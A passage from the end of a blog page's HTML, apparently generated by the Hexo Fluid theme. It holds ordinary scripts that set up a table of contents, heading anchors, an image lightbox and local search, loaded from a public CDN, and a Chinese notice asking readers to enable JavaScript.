      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
